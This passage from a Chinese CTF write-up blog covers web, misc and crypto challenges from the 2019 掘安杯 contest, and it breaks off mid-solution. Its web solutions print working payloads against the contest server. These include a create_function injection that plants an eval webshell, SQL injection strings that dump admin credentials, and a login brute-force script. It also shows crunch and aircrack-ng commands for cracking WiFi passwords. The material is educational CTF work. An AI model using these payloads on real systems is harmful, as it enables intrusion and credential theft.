flag:1DDCTF&#123;chiken_dinner_hyMCX[n47Fx)&#125;","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"2019掘安杯writeup","slug":"掘安杯writeup","date":"2019-04-10T08:05:29.172Z","updated":"2019-04-10T08:20:09.069Z","comments":true,"path":"2019/04/10/掘安杯writeup/","link":"","permalink":"http://yoursite.com/2019/04/10/掘安杯writeup/","excerpt":"","text":"2019掘安杯writeupwebweb签到题打开题目链接发现 点击之后是一个404页面 果断选择抓包 发现： 感觉像是base64编码 于是解码获得flag： 1jactf&#123;jasafe110qweasdzxc&#125; 下载下载打开链接发现下载了一个flag.txt 于是开始思考别的 查看源代码发现123456789101112&lt;html&gt;&lt;head&gt;&lt;title&gt;下载下载&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;?file=flag.txt&quot;&gt;下载flag文件&lt;/a&gt;&lt;!-- &lt;a href=&quot;flag.php&quot;&gt;flag&lt;/a&gt;--&gt;&lt;/body&gt;&lt;/html&gt; 于是尝试下载flag.php1http://120.79.1.69:10002/?file=flag.php flag.php的内容为一种加密解密的方式12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpheader(&apos;Content-Type: text/html; charset=utf-8&apos;); //网页编码function encrypt($data, $key) &#123; $key = md5 ( $key ); $x = 0; $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= $key &#123;$x&#125;; $x ++; &#125; for($i = 0; $i &lt; $len; $i ++) &#123; $str .= chr ( ord ( $data &#123;$i&#125; ) + (ord ( $char &#123;$i&#125; )) % 256 ); &#125; return base64_encode ( $str );&#125;function decrypt($data, $key) &#123; $key = md5 ( $key ); $x = 0; $data = base64_decode ( $data ); $len = strlen ( $data ); $l = strlen ( $key ); for($i = 0; $i &lt; $len; $i ++) &#123; if ($x == $l) &#123; $x = 0; &#125; $char .= substr ( $key, $x, 1 ); $x ++; &#125; for($i = 0; $i &lt; $len; $i ++) &#123; if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) &#123; $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) ); &#125; else &#123; $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) ); &#125; &#125; return $str;&#125;$key=&quot;MyCTF&quot;;$flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;;//encrypt($flag,$key)?&gt; 只需在代码下面添加1echo decrypt($flag,$key); 运行就可以得到flag1myCTF&#123;cssohw456954GUEB&#125; 猜密码题目暂时下架了 该网站已被黑打开页面发现网站被黑 于是用御剑扫到后门 shell.php 开始爆破管理员密码为 hack即可得到flag1jactf&#123;DWDASFASCASFAFASFNKAS&#125; not_easy发现是个代码审计类的题目：123456789101112131415&lt;?phperror_reporting(0);if(isset($_GET[&apos;action&apos;])) &#123; $action = $_GET[&apos;action&apos;];&#125;if(isset($_GET[&apos;action&apos;]))&#123; $arg = $_GET[&apos;arg&apos;];&#125;if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action))&#123; show_source(__FILE__);&#125; else &#123; $action($arg,&apos;&apos;);&#125; 想到了匿名函数绕过 但是他这里有一个正则匹配的问题 看了别人的blog才知道 \\可以绕过这个 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 于是想到绕过方式：1http://120.79.1.69:10006/?action=\\create_function&amp;arg=)&#123;&#125;phpinfo();/* 于是可以构造一个木马：1http://120.79.1.69:10006/?action=\\create_function&amp;arg=)&#123;&#125;eval($_POST[&apos;chuddy&apos;]);/* 就可以得到flag：1jactf&#123;c795359da56ae38ec9132eaad24733fc&#125; 曲折的人生打开页面发现了登陆框 发现可以联合注入 通过测试发现过滤了：1234空格：用/*1*/绕过union：双写绕过ununionionselect: 双写绕过selselctector：双写绕过oorr 于是开始爆值：1234567爆出username：goodboy_g-60Hellowor 登录的时候要注意，用户名中也存在一个or，所以也要进行双写绕过admin&apos;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(username)/*1*/from/*1*/admin),3&apos;#爆出password为 ajahas&amp;&amp;*44askldajajadmin&apos;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(passwoorrd)/*1*/from/*1*/admin),3&apos;# 接下来就是下面验证码的问题 需要用脚本来跑123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python#coding=utf-8import reimport requestsimport sysreload(sys)sys.setdefaultencoding(&quot;utf8&quot;)data=&#123; &apos;username&apos;:&apos;goodboy_g-60Hellowoorr&apos;, &apos;password&apos;:&apos;ajahas&amp;&amp;*44askldajaj&apos;&#125;for i in range(100000000): s = requests.Session() url=&quot;http://120.79.1.69:10005/index.php&quot; r = s.post(url=url,data=data) match = re.search(r&quot;&lt;div class=&apos;rep&apos;&gt;.*&lt;/div&gt;&quot;,r.text).group(0) match = str(match) match = re.sub(&quot;&lt;div class=&apos;rep&apos;&gt;&quot;,&apos;&apos;,match) match = re.sub(&quot;&lt;/div&gt; &lt;/div&gt;&quot;,&apos;&apos;,match) match = re.sub(&quot;（&quot;,&apos;(&apos;,match) match = re.sub(&quot;）X&quot;,&apos;)*&apos;,match) match = re.sub(&quot;）/&quot;,&apos;)/&apos;,match) match = re.sub(&quot;）&quot;,&apos;)&apos;,match) match = eval(match) print match d = &#123; &apos;username&apos;:&apos;goodboy_g-60Hellowoorr&apos;, &apos;password&apos;:&apos;ajahas&amp;&amp;*44askldajaj&apos;, &quot;code&quot;: match &#125; r = s.post(url=url+&quot;?check&quot;,data=d) if &quot;验证码正确&quot; in r.text: print r.text break 跑出来了一个压缩包地址 和密码： 这里面有获取flag.zip的密码获取方式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556Private Function getPassword(ByVal str As String) As String Dim reString As String Dim i As Integer i = 1 While (i &lt;= Len(str)) reString = reString &amp; Mid(str, i, 1) i = i + (i Mod 5) Wend getPassword = reStringEnd FunctionPrivate Sub Command1_Click() Dim Dictionary As String Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot; Dim password As String password = getPassword(Dictionary) Dim psw As String psw = Text1.Text If (psw = password) Then MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot; Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password) Else MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot; End If End Sub 写出解密脚本：1234567891011121314str = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU&quot;print len(str)flag = &quot;&quot;flag1 = &quot;&quot;i =1while i &lt;= len(str): flag += str[i-1:i] i = i + (i%5)i=1while i &lt;= len(flag): flag1 += flag[i-1:i] i = i + (i%5)print flag1 密码为：VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk 解压缩flag.zip之后发现图片打不开，用winhex打开发现flag1flag&#123;Good luck!&#125; audit发现是代码审计123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 &lt;?phphighlight_file(__FILE__);include(&apos;flag.php&apos;);$str1 = @$_GET[&apos;str1&apos;];$str2 = @$_GET[&apos;str2&apos;];$str3 = @$_GET[&apos;str3&apos;];$str4 = @$_GET[&apos;str4&apos;];$str5 = (string)@$_POST[&apos;str5&apos;];$str6 = (string)@$_POST[&apos;str6&apos;];$str7 = (string)@$_POST[&apos;str7&apos;];if( $str1 == $str2 )&#123; die(&apos;str1 OR Sstr2 no no no&apos;);&#125;if( md5($str1) != md5($str2) )&#123; die(&apos;step 1 fail&apos;);&#125;if( $str3 == $str4 )&#123; die(&apos;str3 OR str4 no no no&apos;);&#125;if ( md5($str3) !== md5($str4))&#123; die(&apos;step 2 fail&apos;);&#125;if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123; die(&apos;str5 OR str6 OR str7 no no no&apos;);&#125;if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123; die(&apos;step 3 fail&apos;);&#125;if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;]))&#123; echo &quot;come on!&quot;; die();&#125;$a = $_POST[&apos;a&apos;];$b = $_POST[&apos;b&apos;];$m = $_GET[&apos;m&apos;];$n = $_GET[&apos;n&apos;];if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) &#123; echo &quot;a OR b fail!&quot;; die();&#125;if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) &#123; echo &quot;m OR n fail&quot;; die();&#125;$str8 = hash(&apos;md5&apos;, $a, false);$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n);echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))&#123; echo &quot;You&apos;re great,give you flag:&quot;; echo $flag;&#125;str1 OR Sstr2 no no no 第一步就是利用弱类型绕过。 第二步就是数组绕过。 1str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4就可绕过 但是str5,str6,str7强行转为字符串，数组绕过的方法就行不通了只能用MD5强碰撞123456str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read()str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read()str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read()工具地址为：https://github.com/thereal1024/python-md5-collision 然后就是最后一层的了 需要传递四个参数a,b,m,n$a为大写字母，$b为数字、并且长度为6，$m和$n长度小于4$str8为$ahash加密后的值，$str9为$bhash加密后，把$m替换为$n,要求$str8== $str9。还是用的弱类型。a可以为：QNKCDZO如果$b为hash加密后0e开头，可以满足，长度为6不能满足，但是还有次替换，只需要把0e后不是数字的替换为数字就可以。 然后开始构造：脚本为：123456789101112131415161718192021import requestsimport sysreload(sys)sys.setdefaultencoding(&quot;utf8&quot;)url = &quot;http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=dcb&amp;n=123&quot;str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read()str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read()str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read()data= &#123; &apos;str5&apos;:str5, &apos;str6&apos;:str6, &apos;str7&apos;:str7, &apos;a&apos;:&apos;QNKCDZO&apos;, &apos;b&apos;:&apos;259987&apos;&#125;s = requests.post(url=url,data=data)print s.text 得到flag：1jactf&#123;c795359da56ae38ec9132eaad24733fc&#125; miscmisc签到关注公众号 获得flag1jactf&#123;051bb6f64e70cc8766d62c3ea008eaee&#125; so_easy下载下来发现是个打不开的exe文件 于是放在winhex下 发现有点像base加密尝试了一下发现是base58加密 进行解密发现了像是图片转的base641data:image/bmp;base64, 于是进行在线解密扫描二维码就能得到flag1jactf&#123;base58_base64_flag_very_easy&#125; 这是什么玩意打开txt文件发现是一些有规律的字符串1=E4=BD=9B=E6=9B=B0=EF=BC=9A=E6=A2=B5=E5=83=A7=E5=A5=A2=E6=A5=9E=E5=A5=A2=E5=90=89=E8=8B=A5=E5=A5=A2=E4=B8=8D=E5=B8=9D=E5=86=A5=E5=A4=9C=E6=98=AF=E7=BC=BD=E6=9C=8B=E7=BC=BD=E7=9C=9F=E7=89=B9=E4=BF=B1=E4=B8=8A=E7=BD=B0=E8=83=BD=E7=9A=A4=E5=AE=A4=E9=98=BF=E8=AB=B3=E6=98=8E=E4=B8=80=E5=88=87=E5=91=90=E9=99=A4=E6=A2=B5=E5=A7=AA=E7=BC=BD=E5=A9=86=E5=91=90=E4=BA=A6=E5=8F=83=E4=BE=84=E5=91=BC=E7=9A=A4=E4=B8=96=E5=93=86=E7=89=B9=E5=93=86=E6=95=85=E5=8B=9D=E8=AB=B3=E7=88=8D=E8=AC=B9=E6=99=BA=E7=9A=A4=E5=8F=83=E5=AD=95=E9=80=9D=E8=AB=B3=E8=AC=B9=E6=BC=AB=E6=AD=BB=E5=8D=B3=E4=BE=84=E9=99=A4=E5=93=86=E9=80=9D=E4=BE=84=E6=98=AF=E5=A5=A2=E5=96=9D=E7=A4=99=E8=B1=86=E8=AB=B3=E6=A5=9E=E7=84=A1=E4=BF=B1=E8=80=85=E5=93=86=E5=BA=A6=E8=80=85=E3=80=82=E8=AB=B3=E7=9C=9F=E5=86=A5=E8=A8=B6=E4=BE=84=E5=8B=9D=E7=AB=9F=E8=97=9D=E5=A5=A2=E4=B8=8D=E4=BC=8A=E7=9A=A4=E8=AC=B9=E6=B6=85=E5=AD=95=E7=84=A1=E4=BB=96=E7=BE=85=E5=A4=A7=E5=BE=97=E9=97=8D=E5=93=86=E5=96=9D=E8=80=B6=E5=83=A7=E7=84=A1=E7=BE=AF=E6=BB=85=E9=99=A4=E5=88=A9=E7=BC=BD=E5=A4=9A=E6=A2=B5=E5=A4=B7=E6=A2=B5=E6=A0=97=E7=BC=BD=E8=80=85=E5=AD=95=E8=AB=B3=E7=9B=A7=E7=9A=A4=E4=B8=89=E7=BD=B0=E5=AF=AB=E8=80=81=E6=A2=B5=E8=80=B6=E5=AE=A4=E5=B8=9D=E6=A2=B5=E5=AF=AB=E7=BE=AF=E6=95=B8=E6=A2=B5=E7=9B=A1=E4=BE=84=E6=A0=97=E4=BE=84=E8=97=90=E4=BF=B1=E4=B8=96=E8=AB=B3=E4=B8=8A=E8=AB=B3=E5=A7=AA=E6=95=B8=E5=AE=A4=E5=A9=86=E7=BD=B0=E6=A7=83=E5=A5=A2=E8=A8=B6=E5=93=86=E5=A4=9A=E9=80=9D=E8=97=90=E9=81=93=E6=A2=B5=E6=A5=9E=E6=A2=B5=E5=8D=97=E4=BE=84=E8=BF=A6=E5=91=90=E7=9F=A5=E6=9C=8B=E6=A5=9E=E4=BE=84=E9=9B=A2=E5=91=90=E6=B2=99=E5=91=90=E6=99=BA=E9=81=AE=E5=A4=A7=E5=AE=A4=E7=A5=9E=E5=86=A5=E8=BC=B8=E6=AE=BF=E7=BC=BD=E6=A7=83=E6=A2=B5=E6=80=9B=E6=81=90=E8=88=8D=E7=9F=A5=E7=9A=A4=E8=BF=A6=E5=A5=A2=E8=88=AC=E8=AB=B3=E7=88=8D=E5=AF=AB=E6=BC=AB=E4=BC=8A=E4=BF=B1=E6=A0=97=E5=93=86=E4=BB=96=E4=BA=A6=E7=BC=BD=E6=A5=9E=E6=80=9B=E5=86=A5=E5=91=BC=E5=88=87=E4=BF=B1=E8=8F=A9=E8=88=8D=E5=91=90=E5=AF=A6=E6=A0=97=E5=A5=A2=E6=B3=A2=E6=91=A9=E8=AB=B3=E9=81=93=E7=BC=BD=E7=91=9F=E5=93=86=E5=AF=A6=E7=9A=A4=E7=88=8D=E5=8B=9D=E8=96=A9=E7=BD=B0=E8=AB=B8=E5=A5=A2=E8=88=AC=E8=AB=A6=E7=BD=B0=E6=98=8E=E7=BC=BD=E8=AB=A6=E5=B0=BC=E5=93=86=E6=A5=9E=E4=BD=9B=E4=BF=B1=E9=86=AF=E8=AB=B3=E6=BB=85=E5=BA=A6=E5=93=86=E6=89=80=E6=A7=83=E5=A7=AA=E9=BA=BC=E6=89=80=E6=81=90=E8=AB=B3=E4=BB=96=E4=BE=84=E5=AF=AB=E7=91=9F=E4=BE=84=E6=89=80=E5=BE=97=E9=9A=B8=E5=93=86=E9=97=8D=E5=91=90=E6=8F=90=E7=9B=A7=E5=86=A5=E5=92=92=E5=A5=A2=E6=9B=B0=E5=91=90=E6=B2=99=E6=80=AF=E8=88=AC=E5=8D=97=E6=80=AF=E5=9C=B0=E7=BC=BD=E5=96=9D=E5=86=A5=E6=83=B3=E5=91=90=E7=9B=A7=E7=BD=B0=E8=AC=B9=E5=91=BC=E8=B7=8B=E7=BC=BD=E4=B8=8A=E5=A8=91=E8=AB=A6=E6=AD=BB=E4=BE=84=E8=BF=A6 百度一波发现是 Quoted-printable编码 开始解码 解码获得一个佛曰 于是想到了 与佛论禅 社会主义核心价值观编码 解码获得flag flag为：1jactf&#123;hexin_yufo_qp&#125; 你对我的网站做了什么这是一个流量包分析题，打开流量包直接追踪数据流 发现了php代码 关于一种加密方式 还有一个和flag有关的数据流 分析可知是通过对flag.txt的内容进行加密 绕后输出的 于是写出解密的方法12345&lt;?php$str = &quot;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&quot;;echo gzuncompress(base64_decode($str, 6));?&gt; 得到flag：1flag&#123;U_f1nd_Me!&#125; 小梳子题目叫我们破解wifi密码，已知wifi密码是手机号，前六位是138364，那么就很好办，我们可以自己做一个字典，直接爆破就得到了。 首先使用kali工具生成我们想要的字典 123crunch 11 11 -t 138364%%%%% -o/root/chuddy/test.txt解析：11代表字典最小和最大位都是11位，%代表数字，-o为输出路径 然后开始爆破这个wifi 1aircrack-ng -w /root/chuddy/test.txt Tenda_D07D90-01.cap 输入对应的编号：1，然后就是开始爆破 得到flag：1jactf&#123;13836458932&#125; 这不是真的图片打开是一个图片 分析无果 binwalk一下 发现里面有一个压缩包 但是foremost却不能分离出来 winhex打开文件 查找 14000000 发现压缩包的头 被改为了 ja66 改回之后 再进行分离 打开压缩包 发现需要输入密码 尝试ja66 打开了 发现好多个文件夹 每个文件夹里面都有一个字母 有这些字母组成flag 编写脚本1234567import base64flag=&apos;&apos;for i in range(32): f=open(&apos;./subject/&apos;+str(i)+&apos;/&apos;+str(i)+&apos;.txt&apos;,&apos;r&apos;) flag+=f.read()print flagprint base64.b64decode(flag) 得到flag：1jactf&#123;64se64_1s_50_c001&#125; 该死的温柔这道题就是使用了隐写工具OutGuess，它是一种通用的隐写工具，可以插入将隐藏信息存入数据源的冗余位。 安装工具kali终端命令：1234567git clone https://github.com/crorvick/outguess下载之后双击打开文件夹 输入命令./configure&amp;&amp; make &amp;&amp; make install即可安装成功 查看这个图片的属性，发现备注有个guess 这就是要工具解密的密码然后构造命令1234root@kali:~/chuddy/ctf/jactf/# outguess -k &quot;guess&quot; -r flag.jpg chuddy.txtReading flag.jpg....Extracting usable bits: 11538 bitsSteg retrieve: seed: 206, len: 33 得到flag1jactf&#123;jactf_guess_steganography&#125; 怀疑人生打开发现是三个文件 第一个文件是一个压缩包 需要密码才能打开 于是想到用工具去跑 跑出来密码为 password 打开发现时一串字母 用base64解码得到第一部分的flag1flag&#123;hacker 第二个文件是一个图片使用binwalk分析这个图片 发现隐藏的压缩包 foremost分离 打开压缩包 发现需要密码 用winhex打开发现时压缩包伪加密 把全局伪加密 01 00 ，改为00 00后保存 解压得到了一个txt文件 打开后发现是有 .?!组成的 想到了ook解密 ook解密 解密获得字符串13oD54e 用base58解密获得第二部分的flag1misc 第三个文件像是一个二维码 使用二维码识别工具进行识别 得到最后一部分的flag112580&#125; 三部分拼接在一起结构成了flag1flag&#123;hackermisc12580&#125; CRYPTO签到题发现了一串字符串 像十六进制 12345#coding:utf-8import binasciistr = &quot;6A616374667B6865785F69735F656173797D&quot;print binascii.a2b_hex(str) 得到flag1jactf&#123;hex_is_easy&#125; 罗马帝国的奠基者给了一些奇怪的字符串1h^_o`[pZi^i` 这和jactf前五个字符的ascii码值相差2，3，4，5，6 编写脚本1234567str = &quot;h^_o`[pZi^i`&quot;flag = &quot;&quot;c=2for i in range(len(str)): flag += chr(ord(str[i])+c) c=c+1print flag 得到flag：1jactf&#123;bxcsium&#125; 贝斯家族三英战群魔看到这个题目就这到和basae解码有关 打开txt文件是一长串的字符串 对其进行base16，base32，base64循环解码 就能得到flag 1jactf&#123;4(b64_32_16)&#125; 绝密文件打开文件1234作为我潜伏在宝岛地下工作者小菜截获了一段绝密的情报，具体如下：WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0x而且小菜昨天偷听到了一部分关于情报的绝密资料，如下：N=5520780427 , e = 134257,你能帮小菜解出这段情报吗？ base64解密获得1[264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L] 对n进行因式分解获得pq 分解p q网站 然后一个解密脚本12345678910111213141516# encoding:utf8import rsaimport sysimport gmpy2marr= [264032310L, 4950637341L, 4189137235L, 3503675906L, 1193272L, 374530968L, 5189281531L, 2514200272L, 4454305581L, 641078597L, 4395931659L, 2716426599L, 437539194L, 3448013596L, 307207209L, 4750820606L, 3250407993L, 853905209L, 2109791159L, 2716426599L, 2107899554L, 4395931659L, 2794384598L, 2109791159L, 5297779094L, 1460874286L, 1460874286L, 794931679L, 794931679L, 5447051622L, 853905209L, 3198340218L, 1193272L, 1912323101L, 5297779094L, 307207209L, 3231572608L, 3198340218L, 5189281531L, 527889548L, 4950637341L, 2839366805L, 1116457354L, 527889548L, 5297779094L, 3250407993L, 4454305581L, 6510392L, 3250407993L, 1460874286L, 1059035129L, 3200359612L, 853905209L, 307207209L, 156779101L, 2145301328L, 527889548L, 1059035129L, 5468025072L, 3448013596L, 2107899554L, 4189137235L, 3503675906L, 2653436113L]p = 54163q = 101929 n = 5520780427 e = 134257 d= int(gmpy2.invert(e , (p-1) * (q-1))) result=&quot;&quot;for j in marr: result += chr(pow(j,d,n))print result 得到1U2FsdGVkX1/8DKBmhvO87/SOLaawwxvAdHLB9AV62nC6LhXzhatpvBcg6tlK7Fs5 对其进行DES解密 得到flag 1jactf&#123;So_easy_RSA_and_DES&#125; 贝叶斯打开是一个密码本 需要解密 仿射密码 脚本如下1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#include &lt;iostream&gt;#include &lt;cstring&gt;using namespace std;int gcd(int m, int n);int init_gcd(int m, int n);int des_find(string p, int m);#define PSIZE 65 //宏定义密码表大小int main()&#123; string P(&quot;zQWERTYUIOPxcvbnmasdfASDFGHJKLghjkl_qwZXCVBNMert&#123;yuiop&#125;0123498765&quot;), M(&quot;gf9C&#123;YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7&quot;); //明文空间，与已知密文 string C; //存放解密明文 int i = 2; //求解所有互素的数 int a1; //存放逆元 for (i; i &lt; PSIZE; i++) &#123; if (gcd(i, PSIZE) == 1) &#123; //说明此时的i与28互素 /***求解此时的i的逆元***/ a1 = init_gcd(i, PSIZE); for (int j = 0; j &lt; PSIZE; j++) //控制b的遍历 &#123; cout &lt;&lt; &quot;此时：a=&quot; &lt;&lt; i &lt;&lt; &quot; b=&quot; &lt;&lt; j &lt;&lt; &quot; a的逆元为：&quot; &lt;&lt; a1 &lt;&lt; &quot; \\&quot;&quot;; for (int k = 0; k &lt; M.length(); k++) &#123; //每一个汉字站两个字节，所以要用两个数组空间来存 int where = des_find(P, M[k]); //匹配密文在明文空间的位置 where = ((where - j)*a1) % PSIZE; if (where &lt; 0) &#123; where += PSIZE; &#125; cout &lt;&lt; P[where]; &#125; cout &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; endl; &#125; &#125; &#125; return 0;&#125;int gcd(int b, int a) //求互素&#123; int temp; if (a &lt; b)//判断大小 &#123; temp = a; a = b; b = temp; &#125; if (b == 0) return a; else return gcd(b, a%b);//递归&#125;int init_gcd(int m, int n) //扩展欧几里得算法&#123; int i = 2; for (i; i &lt; 28; i++) &#123; if ((m*i) % n == 1) &#123; return i; &#125; &#125;&#125;int des_find(string p, int m) //位置匹配函数&#123; for (int i = 0; i &lt; p.length(); i ++) &#123; //cout&lt;&lt;p[i]&lt;&lt;p[i+1]&lt;&lt;endl; if (m == p[i]) &#123; return i; &#125; &#125;&#125; 跑出来 找到了flag 1jactf&#123;I_10ve_Crypto_Yov_t0O_e8963F5&#125; 不会奔跑的数字和下划线打开题目发现是 url加密 加密之后 进行base16解密 最后进行base64解密 得到 和flag长得相似的字符串1NEGXJ&#123;48_ter_119_xsoirw_teww&#125; 根据题目 我们只考虑字母发现这一些字符前五位和JACTF的ascii码相差51234567891011str = &quot;NEGXJ&#123;48_ter_119_xsoirw_teww&#125;&quot;str_2 = &quot;NEGXJterxsoirwteww&quot;flag = &quot;&quot;x = 4for i in str: if i.isalpha(): flag += chr(int(ord(i)-x)) else: flag += iprint flag 